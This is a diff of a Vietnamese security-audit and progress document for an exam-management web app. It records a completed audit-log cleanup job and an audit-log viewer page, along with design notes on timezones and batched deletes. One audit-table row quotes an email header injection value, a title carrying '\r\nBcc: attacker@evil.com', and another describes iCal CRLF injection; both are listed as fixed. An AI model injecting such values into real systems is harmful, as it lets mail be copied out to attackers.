@@ -1111,7 +1111,7 @@ lên **ngay trên nút "Đăng nhập"** của form mật khẩu, dù user chưa
 | Rate limit chỉ theo IP và chỉ áp cho `AuthController`. 🟡 *Đã tách policy 2026-08-08:* `login`/`register`/`reset-password` giữ 5/phút, `refresh-token`/`logout` sang `"auth-refresh"` 30/phút — xem mục 2.9. ✅ *Phần `X-Forwarded-For` đã xử lý Day 51:* `UseForwardedHeaders` đặt **đầu chuỗi middleware** → rate limit, `HttpsRedirection` và `AuditLogs.IpAddress` đều thấy IP thật thay vì IP của Nginx | `Program.cs` |
 | Thiếu `UseHsts`, security headers, `AllowedHosts = "*"` | `Program.cs:211-216` |
 | ✅ **ĐÃ VÁ (Day 51)** — **Không có audit trail**: khoá tài khoản, đổi vai, đăng nhập thất bại, refresh token bị dùng lại chỉ ghi vào Serilog → không truy vấn được, bị xoay vòng rồi mất, chỉ đọc qua terminal server. Nay có bảng `AuditLogs` + `IAuditLogger` ghi 16 loại sự kiện kèm IP. ⚠️ **Bẫy gặp khi vá:** bản đầu inject thẳng `ApplicationDbContext` (cùng instance scoped với `AuthService`) — ghi log lỗi thì `try/catch` bắt được nhưng entity **kẹt trong ChangeTracker**, làm vỡ `SaveChanges` tiếp theo của nghiệp vụ chính → **đăng nhập chết**. Phải dùng `IServiceScopeFactory` tạo DbContext riêng: `try/catch` một mình KHÔNG cách ly được lỗi khi DbContext dùng chung | `AuditLogger.cs`, `AuthService.cs`, `AdminUsersController.cs` |
-| ⏳ **Chưa làm** — job dọn `AuditLogs` cũ. Log `Security` sinh mỗi lần login nên bảng phình vô hạn nếu không dọn. Kế hoạch: Hangfire job 03:00 hàng ngày, xoá `Security` quá 30 ngày theo lô 5.000 dòng; `Administrative` giữ mãi | (HM-5) |
+| ✅ **ĐÃ LÀM 2026-08-21 (Day 52)** — job dọn `AuditLogs` cũ. Log `Security` sinh mỗi lần login nên bảng phình vô hạn nếu không dọn. `AuditLogCleanupJob` chạy 03:00 giờ VN, xoá `Security` quá 30 ngày theo lô 5.000 dòng bằng `DELETE TOP (n)`; `Administrative` giữ mãi. Kèm **HM-4** — trang `/admin/audit-logs` để đọc được số log đó: 2 tab + lọc ngày/hành động/người thực hiện | `AuditLogCleanupJob.cs`, `AdminAuditLogsController.cs` |
 | ✅ **ĐÃ XỬ LÝ 2026-08-20 (Day 49)** — iCal injection: `RegisterUrl` ghi thẳng vào `.ics` không escape → URL chứa CRLF chèn được dòng lệnh iCal giả, user import vào Google Calendar thấy nội dung lừa đảo trông như hệ thống gửi. **Bỏ HẲN endpoint** thay vì vá: nút Download đã gỡ khỏi UI từ trước (docs 12) nên đây là **mã chết** — xóa rẻ hơn và chắc hơn escape. ⚠️ Phát hiện thêm khi vá: `EscapeIcal` cũ chỉ xử lý `\n`, **bỏ sót `\r`** (nhiều parser coi `\r` đơn lẻ cũng là hết dòng) → vá nửa vời | ~~`ExamScheduleService.cs:144-145`~~ đã xóa |
 | ✅ **ĐÃ VÁ 2026-08-20 (Day 49)** — **email header injection** (không có trong audit gốc, tìm ra khi vá iCal): `subject` mail nhắc lịch thi ghép `exam.Title` thô. Title chứa `\r\nBcc: attacker@evil.com` là chèn được header SMTP → gửi bản sao mail ra ngoài. Vá bằng `SingleLine()` áp cho subject + mọi field trong body | `ExamReminderService.cs:75-88` |
 
@@ -1206,9 +1206,34 @@ và `Sidebar` hardcode 9 mục cho **mọi vai** nên Admin thấy menu của Us
 ✅ HM-1. Theo dõi phiên thi đang diễn ra + phiên treo                         — Day 51
 ✅ HM-2. (BỎ) Chỉ số "đang online"                                            — xem lý do dưới
 ✅ HM-3. Bảng AuditLogs + ghi 16 loại sự kiện kèm IP                          — Day 51
-□  HM-4. Trang xem nhật ký (lọc theo khoảng ngày, 2 tab bảo mật/quản trị)
-□  HM-5. Job Hangfire dọn log Security quá 30 ngày
+✅ HM-4. Trang xem nhật ký (2 tab + lọc ngày/hành động/người thực hiện)      — Day 52
+✅ HM-5. Job Hangfire dọn log Security quá 30 ngày, 03:00, lô 5.000 dòng     — Day 52
 ```
+
+> **HM-4 — bẫy múi giờ, chỗ dễ sai nhất của trang này.** `AuditLog.CreatedAt` lưu `UtcNow`,
+> còn Admin nghĩ theo ngày giờ VN: "ngày 21/08" của họ là `20/08 17:00 → 21/08 17:00` UTC.
+> Quy đổi để **FE** làm, không phải server — chỉ trình duyệt biết múi giờ của người đang xem;
+> server tự đoán thì Admin ở múi khác thấy log lệch một ngày mà không hiểu vì sao.
+> Kèm bẫy thứ hai: chuỗi ISO từ .NET có thể **không có hậu tố `Z`** → `new Date()` hiểu là giờ
+> địa phương và mọi mốc lệch đúng 7 tiếng. `toUtcDate()` thêm `Z` nếu thiếu.
+>
+> **Dropdown loại hành động lấy DISTINCT từ DB**, không liệt kê hằng số trong `AuditActions`:
+> dropdown chỉ nên hiện thứ lọc ra được cái gì. Liệt kê cả hằng số thì Admin chọn một loại
+> chưa từng xảy ra, thấy bảng rỗng và tưởng bộ lọc hỏng.
+>
+> **Không tô đỏ "đăng nhập thất bại"** — gõ sai mật khẩu là chuyện thường ngày, đỏ khắp bảng
+> thì không còn là cảnh báo. Chỉ đỏ 2 loại cần nhìn ngay: `auth.token.reused` (dấu hiệu token
+> bị đánh cắp) và `auth.login.lockedout`.
+>
+> **Không có endpoint sửa/xoá log** — audit phải append-only, sửa được thì không còn là bằng
+> chứng cho câu "ai đã khoá tài khoản này".
+>
+> **HM-5 — vì sao dùng `DELETE TOP (n)` raw SQL thay vì LINQ `ExecuteDelete().Take()`:** việc
+> EF dịch được `Take()` trong `ExecuteDelete` hay không phụ thuộc provider/phiên bản, mà đây là
+> job chạy **03:00 không ai ngồi xem** — lỗi dịch query là im lặng thất bại hàng đêm. Cách còn
+> lại (lấy 5.000 `Id` rồi xoá theo `Contains`) vướng trần **2100 tham số** của SQL Server.
+> Xoá theo lô vì `DELETE` 500.000 dòng trong một transaction giữ lock bảng rất lâu và phình
+> transaction log — mà 03:00 vẫn có thể có user đang thi.
 
 > **Vì sao BỎ chỉ số "đang online":** JWT là **stateless** — server cấp access token rồi không lưu
 > gì, người dùng đóng tab thì server không hề biết. Không tồn tại danh sách "đang online" để đếm.
